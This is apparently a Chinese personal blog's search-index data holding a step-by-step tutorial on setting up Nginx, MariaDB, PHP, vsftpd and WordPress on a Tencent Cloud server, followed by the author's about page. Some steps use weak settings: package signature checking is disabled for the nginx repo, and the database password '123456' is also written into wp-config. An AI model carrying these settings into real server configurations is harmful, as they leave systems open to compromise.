支持快捷键复制粘贴。 支持鼠标滚屏。 支持中文输入法。 安全性高，每次登录需要输入密码或密钥。 单击控制台，实例的管理页面，选择需要登录的 Linux 云服务器，单击【登录】。如下图所示： 在弹出的【登录Linux实例】窗口，选择【标准登录方式】，单击【立即登录】。如下图所示： 在打开的 WebShell 登录页面，根据实际需求，选择【密码登录】或者【密钥登录】方式进行登录。如下图所示： 如果登录成功，WebShell 界面会出现 Socket connection established 提示。如下图所示： 参考链接：https://cloud.tencent.com/document/product/213/5436 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:2:1","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤2：安装 Nginx #### 执行以下命令，在 /etc/yum.repos.d/ 下创建 nginx.repo 文件。 vi /etc/yum.repos.d/nginx.repo\r#### 按 “i” 切换至编辑模式，写入以下内容。\r[nginx] name = nginx repo baseurl = https://nginx.org/packages/mainline/centos/7/$basearch/ gpgcheck = 0 enabled = 1\r按 “Esc”，输入 “:wq”，保存文件并返回。 #### 执行以下命令，安装 nginx。\ryum install -y nginx\r#### 执行以下命令，打开 nginx.conf 文件。\rvim /etc/nginx/nginx.conf\r#### 按 “i” 切换至编辑模式，编辑 nginx.conf 文件。在 include /etc/nginx/conf.d/*conf;上方添加 server{...} 配置内容。如下图所示：\rserver {\rlisten 80;\rroot /usr/share/nginx/html;\rserver_name localhost;\r#charset koi8-r;\r#access_log /var/log/nginx/log/host.access.log main;\r#\rlocation / {\rindex index.php index.html index.htm;\r}\r#error_page 404 /404.html;\r#redirect server error pages to the static page /50x.html\r#\rerror_page 500 502 503 504 /50x.html;\rlocation = /50x.html {\rroot /usr/share/nginx/html;\r}\r#pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\r#\rlocation ~ .php$ {\rfastcgi_pass 127.0.0.1:9000;\rfastcgi_index index.php;\rfastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\rinclude fastcgi_params;\r}\r}\r按 “Esc”，输入 “:wq”，保存文件并返回。 #### 执行以下命令启动 Nginx。\rsystemctl start nginx\r#### 执行以下命令，设置 Nginx 为开机自启动。\rsystemctl enable nginx #### 在本地浏览器中访问以下地址，查看 Nginx 服务是否正常运行。\rhttp://云服务器实例的公网 IP\r显示如下，则说明 Nginx 安装配置成功。 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:2:2","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤3：安装数据库 #### 执行以下命令，在 /etc/yum.repos.d/ 下创建 MariaDB.repo 文件。 vi /etc/yum.repos.d/MariaDB.repo\r#### 按 “i” 切换至编辑模式，写入以下内容，添加 MariaDB 软件库，不同操作系统的 MariaDB 软件库不同。\r[mariadb]\rname = MariaDB\rbaseurl = http://yum.mariadb.org/10.4/centos7-amd64\rgpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB\rgpgcheck=1\r按 “Esc”，输入 “:wq”，保存文件并返回。 #### 执行以下命令，安装 MariaDB。此步骤耗时较长，请关注安装进度，等待安装完毕。\ryum -y install MariaDB-client MariaDB-server\r#### 执行以下命令，启动 MariaDB 服务。\rsystemctl start mariadb\r#### 执行以下命令，设置 MariaDB 为开机自启动。\rsystemctl enable mariadb\r#### 执行以下命令，验证 MariaDB 是否安装成功。\rmysql\r显示结果如下，则成功安装。 #### 执行以下命令，退出 MariaDB。\r\\q\r","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:2:3","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤4：安装配置 PHP #### 依次执行以下命令，更新 yum 中 PHP 的软件源。 rpm -Uvh https://mirrors.cloud.tencent.com/epel/epel-release-latest-7.noarch.rpm\rrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm\r#### 执行以下命令，安装 PHP 7.2 所需要的包。\ryum -y install mod_php72w.x86_64 php72w-cli.x86_64 php72w-common.x86_64 php72w-mysqlnd php72w-fpm.x86_64\r#### 执行以下命令，启动 PHP-FPM 服务。\rsystemctl start php-fpm\r#### 执行以下命令，设置 PHP-FPM 服务为开机自启动。\rsystemctl enable php-fpm\r","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:2:4","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤5：验证环境配置 当您完成环境配置后，可以通过以下验证 LNMP 环境是否搭建成功。 #### 执行以下命令，创建测试文件。 echo \"\u003c?php phpinfo(); ?\u003e\" \u003e\u003e /usr/share/nginx/html/index.php\r#### 执行以下命令，重启 Nginx 服务。\rsystemctl restart nginx\r#### 在本地浏览器中访问如下地址，查看环境配置是否成功。\rhttp://云服务器实例的公网 IP\r显示结果如下， 则说明环境配置成功。 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:2:5","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"3.Windows 系统通过 FTP 上传文件到云服务器 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:3:0","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤1：安装 vsftpd #### 执行以下命令，安装 vsftpd。 yum install -y vsftpd\r#### 执行以下命令，设置 vsftpd 开机自启动。\rsystemctl enable vsftpd\r#### 执行以下命令，启动 FTP 服务。\rsystemctl start vsftpd\r#### 执行以下命令，确认服务是否启动。\rnetstat -antup | grep ftp\r显示结果如下，则说明 FTP 服务已成功启动。 此时，vsftpd 已默认开启匿名访问模式，无需通过用户名和密码即可登录 FTP 服务器。使用此方式登录 FTP 服务器的用户没有权修改或上传文件的权限。 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:3:1","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤2：配置 vsftpd #### 执行以下命令，为 FTP 服务创建一个 Linux 用户，本文以ftpuser 为例。 useradd ftpuser\r#### 执行以下命令，设置 ftpuser 用户的密码。\rpasswd ftpuser\r输入密码后请按 Enter确认设置，密码默认不显示。 #### 执行以下命令，创建 FTP 服务使用的文件目录，本文以/var/ftp/test为例。\rmkdir /var/ftp/test\r#### 执行以下命令，修改目录权限。\rchown -R ftpuser:ftpuser /var/ftp/test\r#### 执行以下命令，打开 vsftpd.conf文件。\rvim /etc/vsftpd/vsftpd.conf\r按 i 切换至编辑模式，根据实际需求选择 FTP 模式，修改配置文件 vsftpd.conf 修改以下配置参数，设置匿名用户和本地用户的登录权限，设置指定例外用户列表文件的路径，并开启监听 IPv4 sockets。\ranonymous_enable=NO\rlocal_enable=YES\rchroot_local_user=YES\rchroot_list_enable=YES\rchroot_list_file=/etc/vsftpd/chroot_list\rlisten=YES\r在行首添加 #，注释 listen_ipv6=YES配置参数，关闭监听 IPv6 sockets。 #listen_ipv6=YES\r添加以下配置参数，开启被动模式，设置本地用户登录后所在目录，以及云服务器建立数据传输可使用的端口范围值。 local_root=/var/ftp/test\rallow_writeable_chroot=YES\rpasv_enable=YES\rpasv_address=xxx.xx.xxx.xx #请修改为您的 Linux 云服务器公网 IP\rpasv_min_port=40000\rpasv_max_port=45000\r按 Esc 后输入 :wq 保存后退出。 #### 执行以下命令，创建并编辑 chroot_list文件。\rvim /etc/vsftpd/chroot_list\r#### 执行以下命令，重启 FTP 服务。\rsystemctl restart vsftpd\r","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:3:2","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤4：设置安全组 登录 云服务器控制台。在左侧导航栏，单击【安全组】，进入安全组管理页面。 在安全组管理页面，选择【地域】，找到需要设置规则的安全组。 在需要设置规则的安全组行中，单击操作列的【修改规则】。 在安全组规则页面，单击“入站规则”时参考如下配置，添加安全组规则。 方向 类型 来源 协议端口 策略 入方向 自定义 0.0.0.0/0 TCP:20-21 允许 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:3:3","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤5：连接云服务器 在本地下载并安装开源软件 FileZilla，打开 FileZilla，在 FileZilla 窗口中，填写主机、用户名、密码和端口等信息，单击【快速连接】。如下图所示： 配置信息说明： 主机：云服务器的公网 IP。在 云服务器控制台 的实例管理页面可查看对应云服务器的公网 IP。 用户名：搭建 FTP 服务 时设置的 FTP 用户的帐号。图中以 “ftpuser1” 为例。 密码：搭建 FTP 服务 时设置的 FTP 用户帐号对应的密码。 端口：FTP 监听端口，默认为21。 在左下方的“本地站点”窗口中，右键单击待上传的本地文件，选择【上传】，即可将文件上传到 Linux 云服务器。如下图所示： ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:3:4","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"4.手动搭建 WordPress 个人站点 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:4:0","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤1：配置数据库 #### 执行以下命令，进入 MariaDB。 mysql\r#### 执行以下命令，创建 MariaDB 数据库。例如 wordpress。\rCREATE DATABASE wordpress;\r#### 执行以下命令，创建一个新用户。例如user，登录密码为 123456。\rCREATE USER 'user'@'localhost' IDENTIFIED BY '123456';\r#### 执行以下命令，赋予用户对wordpress数据库的全部权限。\rGRANT ALL PRIVILEGES ON wordpress.* TO 'user'@'localhost' IDENTIFIED BY '123456';\r#### 执行以下命令，设置 root 帐户密码。\rALTER USER root@localhost IDENTIFIED VIA mysql_native_password USING PASSWORD('输入您的密码');\r#### 执行以下命令，使所有配置生效。\rFLUSH PRIVILEGES;\r#### 执行以下命令，退出MariaDB。\r\\q\r","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:4:1","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤2：安装和配置 WordPress #### 执行以下命令，删除网站根目录下用于测试 PHP-Nginx 配置的index.php文件。 rm -rf /usr/share/nginx/html/index.php\r从 WordPress 官方网站下载 WordPress 最新中文版本，并利用FileZilla上传文件到/var/ftp/test\r#### 执行以下命令，将安装包移入/usr/share/nginx/html/目录，解压 WordPress。\rcd /usr/share/nginx/html\rcp /var/ftp/test/wordpress-5.6-zh_CN.tar.gz /usr/share/nginx/html/\rtar zxvf wordpress-5.6-zh_CN.tar.gz\r#### 依次执行以下命令，进入 WordPress 安装目录，将wp-config-sample.php文件复制到wp-config.php文件中，并将原先的示例配置文件保留作为备份。\rcd /usr/share/nginx/html/wordpress\rcp wp-config-sample.php wp-config.php\r#### 执行以下命令，打开并编辑新创建的配置文件。\rvim wp-config.php\r#### 按 i 切换至编辑模式，找到文件中 MySQL 的部分，并将相关配置信息修改为 [配置 WordPress 数据库]中的内容。\r// ** MySQL settings - You can get this info from your web host ** //\r/** The name of the database for WordPress */\rdefine('DB_NAME', 'wordpress');\r/** MySQL database username */\rdefine('DB_USER', 'user');\r/** MySQL database password */\rdefine('DB_PASSWORD', '123456');\r/** MySQL hostname */\rdefine('DB_HOST', 'localhost');\r修改完成后，按 Esc，输入 :wq，保存文件返回。 #### 在浏览器地址栏输入http://域名或云服务器实例的公网 IP/wordpress 文件夹，例如：\rhttp://192.xxx.xxx.xx/wordpress\r转至 WordPress 安装页，开始配置 WordPress。 解决wordpress更新提示无法创建目录问题 执行以下命令\rvim /usr/share/nginx/html/wordpress/wp-config.php\r按 i 切换至编辑模式，添加： define(\"FS_METHOD\",\"direct\");\r修改完成后，按 Esc，输入 :wq，保存文件返回。 #### 修改wordpress安装目录所属组及php的配置文件\rchown -R username.username xxx/wordpress/ 修改php配置 执行以下命令 vim /etc/php-fpm.d/www.conf 按 i 切换至编辑模式，修改： user = usrname group = username 修改完成后，按 Esc，输入 :wq，保存文件返回。 重启php-fpm systemctl restart php-fpm\r","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:4:2","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"Hannibal0x 前言 在经历反复被WordPress的动态资源折磨后，转而投入hugo的怀抱，含泪抛弃二次元主题，加载太慢了，真顶不住，自己查找资料就要折腾很久，现在尽力去实现自己最理想的个人blog。👋 关于本菜狗 每天都在沉思我怎么这么菜🤡，他们怎么这么nb。我怎么这么穷💸，他们怎么这么有钱。我怎么这么困😪，他们怎么这么卷。纯纯fw，不懂安全，想要入门，编程全靠ctrl+c和ctrl+v。头好痒，不会要长脑子了吧？🧠 每周规律的作息循环 day1 干饭🍜 day2 追番📺 day3 看小说📖 day4 睡觉🛌 day5 打日麻🀄 day6 反思，不能再堕落了🙏 day7 继续焦虑地摸鱼😁 有没有什么工作躺着就能日进斗金的，请务必介绍给我。🧎‍♂️ ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"","uri":"/about/"}]